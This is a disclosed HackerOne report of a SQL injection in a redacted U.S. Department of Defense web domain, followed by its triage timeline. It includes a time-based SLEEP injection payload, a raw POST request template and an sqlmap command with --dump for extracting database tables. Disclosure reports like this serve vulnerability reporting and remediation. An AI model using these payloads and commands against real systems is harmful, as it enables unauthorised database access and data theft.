---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
  - vuln/xss
  - impact/data-exposure
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-09-09
submitted: 2021-07-15T08:36:12.295Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "brumens"
source: "https://hackerone.com/reports/1262757"
title: "SQL injection located in `███` in POST param `████████` "
---
# SQL injection located in `███` in POST param `████████` 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-09-09

- Report: [https://hackerone.com/reports/1262757](https://hackerone.com/reports/1262757)
- CWE: SQL Injection
- Submitted: 2021-07-15T08:36:12.295Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hey DoD security team!

I was able to exploit an SQL injection [1] in one of your domains.

# Description

An SQL injection [1] was discovered in domain *https://████████/██████* in the parameter *██████████*. The SQL injection was located in a *WHERE* statment fallowed by a *INT* value.
The vulnerable parameter gave an indication quick with an *SQL syntax* error. That exposed it was an *████* database [2] in the backend.
 
# Proof Of Concept
Discovered the SQL injection by inputting an random value to trigger an SQL syntax error.
Discover_Payload: **██████████**
████

The fallowing payload was used for the SQL injection to be be triggered 
Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
██████

Full exploit and gather information from the MYSQL database:
████


## References
[1] https://portswigger.net/web-security/sql-injection - *SQL injection explained*
[2] https://www.mysqltutorial.org/mysql-where/ - *MYSQL WHERE statment explained*
[3] https://www.mysql.com/ - *MYSQL Database*

## Impact

An attacker is able to gather all information stored in the database using boolen based SQL injection. (FULL database controll.)

## System Host(s)
███████

## Affected Product(s) and Version(s)
The whole database is affected and I'm able to gather all information stored in it.

## CVE Numbers


## Steps to Reproduce
1. Go to the domain **
2. Now intercept the request with Burp Suite.
3. Replace the *raw* data with the fallowing:
```
POST /██████ HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: https://█████████
Referer: https://████████/█████████
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

██████=2021█████
```
4 . Save request in Burp Suite => Right click => save item + *Name it*.
5. Run sqlmap command: **sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p ██████████**.
It will quick discover the *███* to be vulnerable for SQL injection and XSS. Wait to it detect and verify it. It will then dump the tables.
as fallowing: (Only gather table and stoped after just as a proof of concept)
████

## Suggested Mitigation/Remediation Actions
Make sure to filter out SQL syntax and quotes and never trust user input.

## Timeline

- **Report Filed**
- **2021-07-15** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2021-07-15** @brumens: Hey!

Is it possible to invite *https://hackerone.com/al-madjus?type=user* (al-madjus) to this report as well? Would be great!
Hope everything is fine and if there is any question related to the issue, let me know!

**Also** can you change the  *severity* on the report to **Critical** I forgotten to add that part. Thanks!

kind regards,
Brumens
- **Report Severity Updated**
- **Report Triaged**
- **2021-07-15** @brumens: Hey,
Is it possible to push this to an Critical issue because I so have full database controll?

Best regards,
Brumens
- **2021-08-25** @brumens: Hey, any updates?
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
